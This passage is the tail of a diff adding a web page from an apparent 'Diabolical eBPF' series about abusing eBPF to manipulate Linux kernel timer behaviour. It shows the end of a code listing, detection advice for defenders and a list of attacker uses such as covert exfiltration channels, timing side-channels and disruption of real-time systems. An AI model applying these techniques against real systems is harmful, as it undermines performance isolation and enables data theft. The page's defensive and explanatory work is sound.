+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="detection-methods">Detection Methods</h3>
+
+<p>Defenders should monitor for:</p>
+<ul>
+  <li>Unexpected eBPF programs attached to timer-related functions</li>
+  <li>Unusual patterns of timer behavior or slack values</li>
+  <li>Processes experiencing unexpected timing delays</li>
+  <li>Discrepancies between requested and actual timer execution</li>
+  <li>Unexplained power consumption or CPU wakeup patterns</li>
+</ul>
+
+<p>This technique demonstrates why proper eBPF restrictions are critical for maintaining timing guarantees and performance isolation, especially in environments with real-time requirements or where power efficiency is important.</p>
+
+<h3 id="real-world-impact">Real-world Impact</h3>
+
+<p>In practical environments, this technique could allow an attacker to:</p>
+<ul>
+  <li>Disrupt real-time processing systems</li>
+  <li>Create covert channels for data exfiltration</li>
+  <li>Cause excessive battery drain on mobile or embedded devices</li>
+  <li>Undermine performance isolation between containers</li>
+  <li>Implement timing side-channels to extract sensitive information</li>
+</ul>
+
+<p>The ability to manipulate kernel timer mechanisms creates particularly concerning scenarios in environments with strict timing requirements, such as industrial control systems, telecommunications, or financial trading platforms.</p>
+
+                    </div>
+                </article>
+
+                
+                <nav class="post-nav">
+                    <div class="post-nav-item prev">
+                        
+                        <span class="nav-label">Previous</span>
+                        <a href="/dBPF/irq-affinity-chaos.html" class="prev">
+                            IRQ Affinity Chaos
+                        </a>
+                        
+                    </div>
+                    <div class="post-nav-item next">
+                        
+                        <span class="nav-label">Next</span>
+                        <a href="/dBPF/kernel-event-loop-hijack.html" class="next">
+                            Kernel Event Loop Hijack
+                        </a>
+                        
+                    </div>
+                </nav>
+                
+            </main>
+
+            <footer class="site-footer">
+                <div class="footer-content">
+                    <p>&copy; 2025 Diabolical eBPF. All rights reserved.</p>
+                </div>
+            </footer>
+        </div>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize mermaid with custom dark theme
+            mermaid.initialize({
+                startOnLoad: false,
+                theme: 'dark',
+                themeVariables: {
+                    darkMode: true,
+                    background: '#000000',
+                    primaryColor: '#00ff9d',
+                    primaryTextColor: '#00ff9d',
+                    primaryBorderColor: '#00ff9d',
+                    lineColor: '#00ff9d',
+                    secondaryColor: '#ff00f7',
+                    tertiaryColor: '#00c3ff',
+                    nodeBorder: '#00ff9d',
+                    clusterBkg: '#000000',
+                    clusterBorder: '#00ff9d',
+                    edgeLabelBackground: '#000000',
+                    fontFamily: 'JetBrains Mono'
+                }
+            });
+
+            // Find all pre code blocks with mermaid class
+            document.querySelectorAll('pre code.language-mermaid').forEach(function(element) {
+                // Create a div for mermaid
+                var div = document.createElement('div');
+                div.className = 'mermaid';
+                div.style.background = '#000000';
+                div.style.padding = '2em';
+                div.style.borderRadius = '8px';
+                div.style.marginBottom = '2em';
+                div.textContent = element.textContent;
+                // Replace the pre element with the div
+                element.parentElement.replaceWith(div);
+            });
+
+            // Run mermaid
+            mermaid.init();
+        });
+    </script>
+</body>
+</html>
